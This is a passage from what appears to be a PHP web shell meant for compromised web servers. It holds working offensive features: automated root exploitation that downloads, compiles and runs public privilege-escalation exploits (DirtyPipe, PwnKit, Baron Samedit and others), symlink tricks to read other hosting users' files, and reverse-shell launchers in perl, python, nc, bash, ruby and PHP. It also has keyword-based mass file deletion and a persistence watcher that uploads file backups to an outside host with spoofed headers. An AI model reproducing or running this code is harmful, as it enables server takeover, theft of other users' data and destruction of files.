        $count = 0;
        foreach ($paths as $p) {
            if (!file_exists($p)) continue;
            if (is_file($p)) {
                $zip->addFile($p, basename($p));
                $count++;
            } elseif (is_dir($p)) {
                $dirBase = basename($p);
                $zip->addEmptyDir($dirBase);
                $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($iter as $f) {
                    $rel = $dirBase . '/' . substr($f->getPathname(), strlen($p) + 1);
                    if ($f->isDir()) $zip->addEmptyDir($rel);
                    else { $zip->addFile($f->getPathname(), $rel); $count++; }
                }
            }
        }
        $zip->close();
        echo json_encode(['ok' => true, 'msg' => "Compressed $count files to $zipName", 'zip_path' => $zipPath]);
        exit;
    }

    if ($fAct === 'extract_zip') {
        $zipFile = isset($_POST['zip_path']) ? $_POST['zip_path'] : '';
        $extractTo = isset($_POST['extract_to']) ? $_POST['extract_to'] : '';
        if (empty($zipFile) || !file_exists($zipFile)) {
            echo json_encode(['err' => 'Zip file not found']); exit;
        }
        if (!class_exists('ZipArchive')) {
            echo json_encode(['err' => 'ZipArchive not available']); exit;
        }
        if (empty($extractTo)) {
            $extractTo = dirname($zipFile);
        }
        if (!is_dir($extractTo)) {
            @mkdir($extractTo, 0755, true);
        }
        $zip = new ZipArchive();
        if ($zip->open($zipFile) !== true) {
            echo json_encode(['err' => 'Cannot open zip file']); exit;
        }
        $count = $zip->numFiles;
        $zip->extractTo($extractTo);
        $zip->close();
        echo json_encode(['ok' => true, 'msg' => "Extracted $count files to $extractTo"]);
        exit;
    }

    if ($fAct === 'download') {
        echo json_encode(['ok' => true, 'download_url' => '?dl=' . urlencode($fPath) . '&_xk=labs']);
        exit;
    }

    
    if ($fAct === 'auto_root_scan') {
        $kernel = trim(safeExec('uname -r 2>/dev/null') ?: '');
        $kernelAll = trim(safeExec('uname -a 2>/dev/null') ?: '');
        $os = trim(safeExec('cat /etc/os-release 2>/dev/null | head -5') ?: safeExec('cat /etc/issue 2>/dev/null') ?: '');
        $arch = trim(safeExec('uname -m 2>/dev/null') ?: '');
        $whoami = trim(safeExec('whoami 2>/dev/null') ?: get_current_user());
        $uid = trim(safeExec('id 2>/dev/null') ?: '');
        $gcc = trim(safeExec('which gcc 2>/dev/null') ?: safeExec('which cc 2>/dev/null') ?: '');
        $writable = is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : (is_writable('/var/tmp') ? '/var/tmp' : ''));
        $sudoVer = trim(safeExec('sudo --version 2>/dev/null | head -1') ?: '');
        $pkexecVer = trim(safeExec('pkexec --version 2>/dev/null') ?: '');
        $suidBins = trim(safeExec('find / -perm -4000 -type f 2>/dev/null | head -30') ?: '');
        $dockerSock = file_exists('/var/run/docker.sock') ? 'yes' : 'no';
        $inDocker = file_exists('/.dockerenv') ? 'yes' : 'no';
        $kMajor = 0; $kMinor = 0; $kPatch = 0;
        if (preg_match('/^(\d+)\.(\d+)\.(\d+)/', $kernel, $km)) {
            $kMajor = (int)$km[1]; $kMinor = (int)$km[2]; $kPatch = (int)$km[3];
        }
        $exploits = [];
        if ($kMajor == 5 && (($kMinor >= 8 && $kMinor < 16) || ($kMinor == 16 && $kPatch < 11) || ($kMinor == 15 && $kPatch < 25) || ($kMinor == 10 && $kPatch < 102))) {
            $exploits[] = ['cve'=>'CVE-2022-0847','name'=>'DirtyPipe','desc'=>'Overwrite read-only files via pipe splice','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c','compile'=>'gcc exploit.c -o exploit','run'=>'./exploit /usr/bin/su'];
        }
        if (($kMajor == 2 && $kMinor >= 6) || ($kMajor == 3) || ($kMajor == 4 && ($kMinor < 8 || ($kMinor == 8 && $kPatch < 3)))) {
            $exploits[] = ['cve'=>'CVE-2016-5195','name'=>'DirtyCow','desc'=>'Race condition in COW mechanism','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c','compile'=>'gcc -pthread dirty.c -o dirty -lcrypt','run'=>'./dirty'];
        }
        if (!empty($pkexecVer) || strpos($suidBins, 'pkexec') !== false) {
            $exploits[] = ['cve'=>'CVE-2021-4034','name'=>'PwnKit','desc'=>'Polkit pkexec local privesc','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c','compile'=>'gcc PwnKit.c -o PwnKit','run'=>'./PwnKit'];
        }
        if (!empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv)) {
            if (version_compare($sv[1], '1.9.5', '<')) {
                $exploits[] = ['cve'=>'CVE-2021-3156','name'=>'Baron Samedit','desc'=>'Sudo heap overflow via sudoedit -s','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c','compile'=>'gcc hax.c -o hax','run'=>'./hax'];
            }
        }
        $glibcVer = trim(safeExec('ldd --version 2>&1 | head -1') ?: '');
        if (preg_match('/(\d+\.\d+)/', $glibcVer, $gm)) {
            if (version_compare($gm[1], '2.34', '>=') && version_compare($gm[1], '2.39', '<')) {
                $exploits[] = ['cve'=>'CVE-2023-4911','name'=>'Looney Tunables','desc'=>'Glibc ld.so GLIBC_TUNABLES overflow','severity'=>'HIGH','url'=>'','compile'=>'','run'=>'GLIBC_TUNABLES exploit'];
            }
        }
        if (($kMajor == 5 && $kMinor >= 11) || ($kMajor == 6 && $kMinor < 2)) {
            $exploits[] = ['cve'=>'CVE-2023-0386','name'=>'OverlayFS','desc'=>'OverlayFS setuid copy up','severity'=>'HIGH','url'=>'','compile'=>'make','run'=>'./exploit'];
        }
        if (stripos($kernelAll, 'ubuntu') !== false || stripos($os, 'ubuntu') !== false) {
            if (($kMajor == 5 && $kMinor >= 15) || $kMajor == 6) {
                $exploits[] = ['cve'=>'CVE-2023-2640','name'=>'GameOver(lay)','desc'=>'Ubuntu OverlayFS one-liner','severity'=>'CRITICAL','url'=>'','compile'=>'','run'=>"unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/;setfattr -n trusted.overlay.metacopy -v y l/passwd;mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && touch m/passwd && u/passwd\""];
            }
        }
        if (!empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv2)) {
            if (version_compare($sv2[1], '1.8.28', '<')) {
                $exploits[] = ['cve'=>'CVE-2019-14287','name'=>'Sudo Bypass','desc'=>'Sudo -u#-1 bypass','severity'=>'MEDIUM','url'=>'','compile'=>'','run'=>'sudo -u#-1 /bin/bash'];
            }
        }
        if ($kMajor == 5 && $kMinor >= 4 && $kMinor <= 6) {
            $exploits[] = ['cve'=>'CVE-2022-25636','name'=>'Netfilter OOB','desc'=>'nf_tables OOB write','severity'=>'HIGH','url'=>'','compile'=>'gcc exploit.c -o exploit -lmnl -lnftnl','run'=>'./exploit'];
        }
        if ($dockerSock === 'yes') {
            $exploits[] = ['cve'=>'N/A','name'=>'Docker Socket','desc'=>'Escape via docker.sock','severity'=>'HIGH','url'=>'','compile'=>'','run'=>'docker run -v /:/mnt --rm -it alpine chroot /mnt sh'];
        }
        $suidExploits = [];
        $dangerSuid = ['nmap','vim','find','bash','python','python3','perl','ruby','php','env','awk','less','more','ftp','socat','wget','curl','nc','ncat','node','lua'];
        foreach (explode("\n", $suidBins) as $sb) {
            $bn = basename(trim($sb));
            if (in_array($bn, $dangerSuid)) $suidExploits[] = ['bin'=>trim($sb),'name'=>$bn];
        }
        echo json_encode(['ok'=>true,'info'=>['kernel'=>$kernel,'kernel_full'=>$kernelAll,'os'=>$os,'arch'=>$arch,'user'=>$whoami,'uid'=>$uid,'gcc'=>($gcc ? $gcc : 'not found'),'writable_dir'=>($writable ? $writable : 'none'),'sudo'=>$sudoVer,'pkexec'=>$pkexecVer,'glibc'=>$glibcVer,'docker_sock'=>$dockerSock,'in_docker'=>$inDocker],'exploits'=>$exploits,'suid_exploits'=>$suidExploits,'suid_bins'=>$suidBins]);
        exit;
    }

    
    if ($fAct === 'auto_root_exec') {
        $exploitUrl = isset($_POST['exploit_url']) ? $_POST['exploit_url'] : '';
        $compileCmd2 = isset($_POST['compile_cmd']) ? $_POST['compile_cmd'] : '';
        $runCmd3 = isset($_POST['run_cmd']) ? $_POST['run_cmd'] : '';
        $customCmd = isset($_POST['custom_cmd']) ? $_POST['custom_cmd'] : '';
        $workDir = is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : '/var/tmp');
        $workDir .= '/.lp_' . substr(md5(rand()), 0, 8);
        @mkdir($workDir, 0755, true);
        $log = '';
        if (!empty($customCmd)) {
            $log .= "[*] Custom command...\n";
            $dlOut = safeExec("cd $workDir && $customCmd 2>&1");
            $log .= $dlOut ? $dlOut : '(no output)';
        } else {
            if (!empty($exploitUrl)) {
                $log .= "[*] Downloading exploit...\n";
                $dl = safeExec("cd $workDir && curl -fsSL -o exploit_src.c '$exploitUrl' 2>&1");
                if (empty($dl)) $dl = safeExec("cd $workDir && wget -q -O exploit_src.c '$exploitUrl' 2>&1");
                $fsize = @filesize("$workDir/exploit_src.c");
                $log .= "Downloaded: " . ($fsize ? $fsize : 0) . " bytes\n\n";
            }
            if (!empty($compileCmd2)) {
                $log .= "[*] Compiling...\n";
                $ccOut = safeExec("cd $workDir && $compileCmd2 2>&1");
                $log .= ($ccOut ? $ccOut : "(done)") . "\n\n";
            }
            if (!empty($runCmd3)) {
                $log .= "[*] Executing exploit...\n";
                safeExec("cd $workDir && chmod +x * 2>/dev/null");
                $exOut = safeExec("cd $workDir && $runCmd3 2>&1");
                $log .= ($exOut ? $exOut : "(no output)") . "\n";
            }
        }
        $postWho = trim(safeExec('whoami 2>/dev/null') ?: '');
        $postId = trim(safeExec('id 2>/dev/null') ?: '');
        $isRoot = ($postWho === 'root' || strpos($postId, 'uid=0') !== false);
        $log .= "\n=== Result ===\nUser: $postWho\nID: $postId\nRoot: " . ($isRoot ? 'YES!' : 'NO');
        safeExec("rm -rf $workDir 2>/dev/null");
        echo json_encode(['ok'=>true,'log'=>$log,'is_root'=>$isRoot,'user'=>$postWho,'id'=>$postId]);
        exit;
    }

    if ($fAct === 'create_symlink') {
        $symMode = isset($_POST['sym_mode']) ? $_POST['sym_mode'] : 'file';

        
        if ($symMode === 'file') {
            $target   = isset($_POST['symlink_target']) ? $_POST['symlink_target'] : '';
            $linkName = isset($_POST['symlink_name'])   ? $_POST['symlink_name']   : '';
            $dir      = isset($_POST['target_dir'])     ? $_POST['target_dir']     : '';
            if (empty($target) || empty($linkName) || empty($dir)) {
                echo json_encode(array('err' => 'Target path, link name, and directory are required')); exit;
            }
            $linkPath = rtrim($dir, '/') . '/' . $linkName;
            if (file_exists($linkPath) || is_link($linkPath)) { @unlink($linkPath); }
            $ok = false;
            if (function_exists('symlink')) { $ok = @symlink($target, $linkPath); }
            if (!$ok) {
                $cmd = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($linkPath);
                @shell_exec($cmd); @exec($cmd); @system($cmd); @passthru($cmd);
                $ok = is_link($linkPath);
            }
            if ($ok) {
                $url = getFileUrl($linkPath);
                echo json_encode(array('ok' => true, 'msg' => 'Symlink created: ' . $linkName . ' -> ' . $target, 'url' => $url));
            } else {
                $err = error_get_last();
                echo json_encode(array('err' => 'Failed to create symlink' . ($err ? ': ' . $err['message'] : '')));
            }
            exit;
        }

        
        if ($symMode === 'symphp') {
            $dataDir = dirname(__FILE__) . '/abyes_DATA/abyessymlink';
            @mkdir($dataDir, 0777, true);
            $htaccess = $dataDir . '/.htaccess';
            if (!file_exists($htaccess)) {
                @file_put_contents($htaccess, "Options +Indexes\nOptions +FollowSymLinks\nDirectoryIndex None\n");
            }
            $rootLink = $dataDir . '/root';
            if (!is_link($rootLink)) {
                $ok = false;
                if (function_exists('symlink')) $ok = @symlink('/', $rootLink);
                if (!$ok) { @shell_exec("ln -s / " . escapeshellarg($rootLink)); @exec("ln -s / " . escapeshellarg($rootLink)); $ok = is_link($rootLink); }
            } else { $ok = true; }
            $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
            $scriptPath = str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__);
            $scriptDir  = dirname($scriptPath);
            $symlinkBase = $baseUrl . $scriptDir . '/abyes_DATA/abyessymlink/root';
            $rows = array();
            $domains = array(); $state = '';
            if (@file_exists('/etc/named.conf') && @is_readable('/etc/named.conf')) {
                $lines = @file('/etc/named.conf', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                if ($lines) { foreach ($lines as $l) { if (preg_match('#zone\s+"([^"]+)"#', $l, $m)) $domains[] = $m[1]; } $state = 'named.conf'; }
            }
            if (empty($domains)) {
                $valiases = @scandir('/etc/valiases');
                if ($valiases) { foreach ($valiases as $v) { if ($v !== '.' && $v !== '..') $domains[] = $v; } $state = 'valiases'; }
            }
            if (empty($domains)) {
                $named = @scandir('/var/named');
                if ($named) { foreach ($named as $v) { if ($v !== '.' && $v !== '..') $domains[] = rtrim($v, '.db'); } $state = 'named'; }
            }
            if (!empty($domains)) {
                foreach ($domains as $dom) {
                    $dom = trim($dom);
                    if (strlen($dom) < 3) continue;
                    $owner = '';
                    if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
                        $f = '/etc/valiases/' . $dom;
                        if (@file_exists($f)) { $pw = @posix_getpwuid(@fileowner($f)); $owner = $pw ? $pw['name'] : ''; }
                    }
                    if (!$owner) { $owner = strtok($dom, '.'); }
                    $pubPath = '/home/' . $owner . '/public_html';
                    $symPath = $symlinkBase . $pubPath;
                    $rows[] = array('domain' => $dom, 'owner' => $owner, 'path' => $pubPath, 'url' => $symPath);
                }
            }
            echo json_encode(array('ok' => $ok, 'rows' => $rows, 'root_url' => $symlinkBase, 'msg' => $ok ? 'Root symlink ready' : 'symlink() disabled — trying shell'));
            exit;
        }

        
        if ($symMode === 'symperl' || $symMode === 'sympy') {
            $dataDir = dirname(__FILE__) . '/cgiabyes';
            @mkdir($dataDir, 0777, true);
            $htaccess = $dataDir . '/.htaccess';
            if (!file_exists($htaccess)) {
                @file_put_contents($htaccess, "Options +ExecCGI\nAddHandler cgi-script .alfa .pl .py\nOptions +FollowSymLinks\n");
            }
            $makepwd = "/home/{user}/public_html/";
            $lang = ($symMode === 'sympy') ? 'python' : 'perl';
            $canRun = false;
            foreach (array('system','exec','shell_exec','passthru') as $fn) { if (function_exists($fn)) { $canRun = true; break; } }
            $out = '';
            if ($canRun) {
                $tmpFile = $dataDir . '/' . $lang . '_sym_' . rand(1000,9999) . ($lang === 'perl' ? '.pl' : '.py');
                if ($lang === 'perl') {
                    $code = "#!/usr/bin/perl\nuse strict;\nmy \$path = \"$makepwd\";\nopen(F,'</etc/passwd') or die;\nwhile(<F>){ chomp;\nmy @f=split(/:/,\$_); my \$u=\$f[0]; my \$id=\$f[2];\nnext if \$id < 500;\nmy \$p=\$path; \$p=~s/\\{user\\}/\$u/g;\nif(-d \$p){ symlink(\$p,\"" . $dataDir . "/\$u\"); print \"[+] \$u => \$p\\n\"; }\n}\nclose F;\n";
                } else {
                    $code = "#!/usr/bin/python\nimport os,re\npath = \"$makepwd\"\ntry:\n  f=open('/etc/passwd')\n  for line in f:\n    parts=line.strip().split(':')\n    if len(parts)<3: continue\n    u=parts[0]; uid=int(parts[2])\n    if uid < 500: continue\n    p=path.replace('{user}',u)\n    if os.path.isdir(p):\n      try: os.symlink(p,\"" . $dataDir . "/\"+u); print('[+] '+u+' => '+p)\n      except: pass\nexcept: pass\n";
                }
                @file_put_contents($tmpFile, $code);
                @chmod($tmpFile, 0755);
                if (function_exists('exec')) { @exec("$lang $tmpFile 2>&1", $lines_out); $out = implode("\n", $lines_out); }
                elseif (function_exists('shell_exec')) { $out = @shell_exec("$lang $tmpFile 2>&1"); }
                elseif (function_exists('system')) { ob_start(); @system("$lang $tmpFile 2>&1"); $out = ob_get_clean(); }
                @unlink($tmpFile);
            }
            $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
            $scriptDir = dirname(str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__));
            echo json_encode(array('ok' => true, 'output' => $out ?: 'Executed (no output)', 'base_url' => $baseUrl . $scriptDir . '/cgiabyes/'));
            exit;
        }

        echo json_encode(array('err' => 'Unknown sym_mode')); exit;
    }

    if ($fAct === 'backconnect') {
        $bt = $_POST['bc_type'] ?? 'php';
        $bh = $_POST['bc_host'] ?? '';
        $bp = intval($_POST['bc_port'] ?? 0);
        if (!$bh || $bp < 1 || $bp > 65535) {
            echo json_encode(['err' => 'Valid host and port (1-65535) required']); exit;
        }
        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
        $availExec = [];
        foreach (['exec','shell_exec','system','passthru','popen','proc_open'] as $fn) {
            if (function_exists($fn) && !in_array($fn, $disabled)) $availExec[] = $fn;
        }

        $cmd = '';
        switch ($bt) {
            case 'perl':
                $cmd = 'perl -e \'use Socket;$i="'.$bh.'";$p='.$bp.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &';
                break;
            case 'python':
                $cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$bh.'",'.$bp.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &';
                break;
            case 'nc':
                $nb = trim(@shell_exec('which nc 2>/dev/null') ?: @shell_exec('which ncat 2>/dev/null') ?: 'nc');
                $cmd = "$nb -e /bin/sh $bh $bp &";
                break;
            case 'bash':
                $cmd = "bash -c 'bash -i >& /dev/tcp/$bh/$bp 0>&1' &";
                break;
            case 'ruby':
                $cmd = 'ruby -rsocket -e \'f=TCPSocket.open("'.$bh.'",'.$bp.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &';
                break;
            default: // PHP
                if (!in_array('proc_open', $availExec)) {
                    $sock = @fsockopen($bh, $bp, $en, $es, 10);
                    if (!$sock) { echo json_encode(['err' => "Connection failed: $es ($en)"]); exit; }
                    $sh = @popen('/bin/sh -i', 'r');
                    if (!$sh) {
                        @fclose($sock);
                        echo json_encode(['err' => 'Cannot spawn shell (proc_open/popen disabled)']); exit;
                    }
                    @fclose($sock);
                    echo json_encode(['ok' => true, 'msg' => "PHP backconnect attempted to $bh:$bp (limited mode)"]); exit;
                }
                $sock = @fsockopen($bh, $bp, $en, $es, 10);
                if (!$sock) { echo json_encode(['err' => "Connection failed: $es ($en)"]); exit; }
                $descriptors = [0 => $sock, 1 => $sock, 2 => $sock];
                $proc = @proc_open('/bin/sh -i', $descriptors, $pipes);
                if (!is_resource($proc)) {
                    @fclose($sock);
                    echo json_encode(['err' => 'proc_open failed to spawn shell']); exit;
                }
                echo json_encode(['ok' => true, 'msg' => "PHP backconnect established to $bh:$bp"]); exit;
        }

        if (empty($availExec)) {
            echo json_encode(['err' => 'No exec functions available. Disabled: ' . ini_get('disable_functions')]); exit;
        }
        $out = '';
        if (in_array('exec', $availExec)) { @exec($cmd . ' 2>&1', $oa); $out = implode("\n", $oa ?? []); }
        elseif (in_array('shell_exec', $availExec)) { $out = @shell_exec($cmd . ' 2>&1') ?: ''; }
        elseif (in_array('system', $availExec)) { ob_start(); @system($cmd . ' 2>&1'); $out = ob_get_clean(); }
        elseif (in_array('passthru', $availExec)) { ob_start(); @passthru($cmd . ' 2>&1'); $out = ob_get_clean(); }
        elseif (in_array('popen', $availExec)) { $p = @popen($cmd . ' 2>&1', 'r'); if ($p) { $out = @fread($p, 4096); @pclose($p); } }
        echo json_encode([
            'ok' => true,
            'msg' => ucfirst($bt) . " backconnect launched to $bh:$bp",
            'output' => $out,
            'exec_used' => $availExec[0] ?? 'none'
        ]); exit;
    }

    echo json_encode(['err' => 'unknown file action']);
    exit;
}



if (isset($_POST['do_mass_delete']) && isAuthenticated()) {
    $code = isset($_POST['code_content']) ? $_POST['code_content'] : '';
    $dir  = isset($_POST['target_dir'])   ? trim($_POST['target_dir']) : '';
    if (empty($dir)) $dir = dirname(__FILE__);
    $keywords = array();
    if (!empty($code)) {
        foreach (explode("\n", $code) as $ln) {
            $ln = trim($ln); if ($ln !== '') $keywords[] = $ln;
        }
    }
    $ok = 0; $fail = 0; $scanned = 0; $deletedLines = '';
    $massDelErr = '';
    if (!is_dir($dir)) {
        $massDelErr = "Error: Not a directory: " . $dir;
    } else {
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($iterator as $item) {
                if (!$item->isFile()) continue;
                $scanned++;
                $del = false;
                if (!empty($keywords)) {
                    $fc = @file_get_contents($item->getPathname());
                    if ($fc !== false) {
                        foreach ($keywords as $kw) {
                            if (strpos($fc, $kw) !== false) { $del = true; break; }
                        }
                    }
                } else {
                    $del = true;
                }
                if ($del) {
                    @chmod($item->getPathname(), 0644);
                    if (@unlink($item->getPathname())) {
                        $ok++;
                        $url = getFileUrl($item->getPathname());
                        $deletedLines .= "  [DELETED] " . $item->getPathname();
                        if ($url) $deletedLines .= "\n           " . $url;
                        $deletedLines .= "\n";
                    } else {
                        $fail++;
                        $deletedLines .= "  [FAILED]  " . $item->getPathname() . "\n";
                    }
                }
            }
            if (empty($keywords)) {
                $dirIter = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($dirIter as $d) {
                    if ($d->isDir()) { @chmod($d->getPathname(), 0755); @rmdir($d->getPathname()); }
                }
            }
        } catch (Exception $e) {
            $massDelErr = "Exception: " . $e->getMessage();
        }
    }
    if ($massDelErr) {
        $cmdOutput = $massDelErr;
    } else {
        $kwLabel = !empty($keywords) ? implode(', ', $keywords) : '(ALL FILES)';
        $cmdOutput  = "=== Mass Delete by Content ===\n";
        $cmdOutput .= "Directory : " . $dir . "\n";
        $cmdOutput .= "Keywords  : " . $kwLabel . "\n";
        $cmdOutput .= "Scanned   : " . $scanned . " files\n";
        $cmdOutput .= "Deleted   : " . $ok . " files\n";
        $cmdOutput .= "Failed    : " . $fail . " files\n";
        if ($deletedLines) $cmdOutput .= "\n" . $deletedLines;
        else               $cmdOutput .= "\nNo matching files found.\n";
    }
    $responseMessage = 'Mass Delete selesai: ' . $ok . ' dihapus.';
}



function lp_lock_load($lockStore) {
    $entries = array();
    if (!@file_exists($lockStore)) return $entries;
    $lines = @file($lockStore, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return $entries;
    foreach ($lines as $l) {
        $l = trim($l); if (!$l) continue;
        $parts = explode('|', $l, 5);
        $entries[] = array(
            'path'       => $parts[0],
            'perm'       => isset($parts[1]) ? $parts[1] : '0444',
            'backup_url' => isset($parts[2]) ? $parts[2] : '',
            'baseline_size' => isset($parts[3]) ? intval($parts[3]) : 0,
            'baseline_hash' => isset($parts[4]) ? trim($parts[4]) : '',
        );
    }
    return $entries;
}
function lp_lock_save($lockStore, $entries) {
    $lines = array();
    foreach ($entries as $e) {
        $size = isset($e['baseline_size']) ? $e['baseline_size'] : 0;
        $hash = isset($e['baseline_hash']) ? $e['baseline_hash'] : '';
        $lines[] = $e['path'] . '|' . $e['perm'] . '|' . $e['backup_url'] . '|' . $size . '|' . $hash;
    }
    @file_put_contents($lockStore, $lines ? implode("\n", $lines) . "\n" : '');
}
function lp_upload_figma($filePath) {
    if (!@file_exists($filePath) || is_dir($filePath)) return '';
    $content = @file_get_contents($filePath);
    if ($content === false || $content === '') return '';
    $apiUrl  = 'https://help.figma.com/api/v2/uploads.json?filename=' . rawurlencode(basename($filePath));
    $hdrs = array(
        'Content-Type: application/octet-stream',
        'Content-Length: ' . strlen($content),
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9',
        'Origin: https://upload.c99.nl',
        'Referer: https://upload.c99.nl/',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: cross-site',
    );
    $resp = '';
    if (function_exists('curl_init')) {
        $ch = curl_init($apiUrl);
        curl_setopt_array($ch, array(
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $content,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_HTTPHEADER     => $hdrs,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
        ));
        $resp = curl_exec($ch);
        curl_close($ch);
    }
    if (!$resp) {
        $ctx = @stream_context_create(array('http' => array(
            'method'        => 'POST',
            'header'        => implode("\r\n", $hdrs),
            'content'       => $content,
            'timeout'       => 30,
            'ignore_errors' => true,
        )));
        $resp = @file_get_contents($apiUrl, false, $ctx);
    }
    if (!$resp) return '';
    $json = @json_decode($resp, true);
    if (!$json) return '';
    $att = isset($json['upload']['attachment'])
           ? $json['upload']['attachment']
           : (isset($json['upload']['attachments'][0]) ? $json['upload']['attachments'][0] : null);
    if (!$att) return '';
    return isset($att['mapped_content_url']) ? $att['mapped_content_url']
         : (isset($att['content_url'])        ? $att['content_url']        : '');
}
function lp_build_php_watcher($phpWatchFile, $lockStore) {
    $storeEsc = addslashes($lockStore);
    $php  = "<?php\n";
    $php .= "set_time_limit(0);\n";
    $php .= "ignore_user_abort(true);\n";
    $php .= "\$store = '" . $storeEsc . "';\n";
    $php .= "\n";
    $php .= "function watcher_fetch(\$url) {\n";
    $php .= "    if (function_exists('curl_init')) {\n";
    $php .= "        \$ch = curl_init(\$url);\n";
    $php .= "        curl_setopt_array(\$ch, array(CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>20,\n";
    $php .= "            CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false,\n";
    $php .= "            CURLOPT_USERAGENT=>'Mozilla/5.0'));\n";
    $php .= "        \$r = curl_exec(\$ch); curl_close(\$ch);\n";
    $php .= "        if (\$r !== false && \$r !== '') return \$r;\n";
    $php .= "    }\n";
    $php .= "    \$ctx = stream_context_create(array('http'=>array('method'=>'GET','timeout'=>20,\n";
    $php .= "        'ignore_errors'=>true,'header'=>\"User-Agent: Mozilla/5.0\\r\\n\")));\n";
    $php .= "    return @file_get_contents(\$url, false, \$ctx);\n";
    $php .= "}\n";
    $php .= "\n";
    $php .= "function watcher_upload_figma(\$filePath) {\n";
    $php .= "    if (!file_exists(\$filePath) || is_dir(\$filePath)) return '';\n";
    $php .= "    \$raw = @file_get_contents(\$filePath);\n";
    $php .= "    if (\$raw === false || \$raw === '') return '';\n";
    $php .= "    \$apiUrl = 'https://help.figma.com/api/v2/uploads.json?filename=' . rawurlencode(basename(\$filePath));\n";
    $php .= "    \$hdrs = array('Content-Type: application/octet-stream',\n";
    $php .= "        'Content-Length: ' . strlen(\$raw),\n";
    $php .= "        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n";
    $php .= "        'Accept: */*', 'Origin: https://upload.c99.nl', 'Referer: https://upload.c99.nl/');\n";
    $php .= "    \$resp = '';\n";
    $php .= "    if (function_exists('curl_init')) {\n";
    $php .= "        \$ch = curl_init(\$apiUrl);\n";
    $php .= "        curl_setopt_array(\$ch, array(CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>\$raw,\n";
    $php .= "            CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>30,\n";
    $php .= "            CURLOPT_HTTPHEADER=>\$hdrs, CURLOPT_SSL_VERIFYPEER=>false));\n";
    $php .= "        \$resp = curl_exec(\$ch); curl_close(\$ch);\n";
    $php .= "    }\n";
    $php .= "    if (!\$resp) {\n";
    $php .= "        \$ctx = stream_context_create(array('http'=>array('method'=>'POST',\n";
    $php .= "            'header'=>implode(\"\\r\\n\",\$hdrs), 'content'=>\$raw,\n";
    $php .= "            'timeout'=>30, 'ignore_errors'=>true)));\n";
    $php .= "        \$resp = @file_get_contents(\$apiUrl, false, \$ctx);\n";
    $php .= "    }\n";
    $php .= "    if (!\$resp) return '';\n";
    $php .= "    \$j = @json_decode(\$resp, true);\n";
    $php .= "    \$att = isset(\$j['upload']['attachment']) ? \$j['upload']['attachment']\n";
    $php .= "         : (isset(\$j['upload']['attachments'][0]) ? \$j['upload']['attachments'][0] : null);\n";
    $php .= "    if (!\$att) return '';\n";
    $php .= "    return isset(\$att['mapped_content_url']) ? \$att['mapped_content_url']\n";
    $php .= "         : (isset(\$att['content_url']) ? \$att['content_url'] : '');\n";
    $php .= "}\n";
    $php .= "\n";
    $php .= "function watcher_update_store(\$store, \$target, \$newBakUrl) {\n";
    $php .= "    \$lines = @file(\$store, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);\n";
    $php .= "    if (!\$lines) return;\n";
    $php .= "    \$out = array();\n";
    $php .= "    foreach (\$lines as \$l) {\n";
    $php .= "        \$p = explode('|', \$l, 3);\n";
    $php .= "        if (trim(\$p[0]) === \$target) {\n";
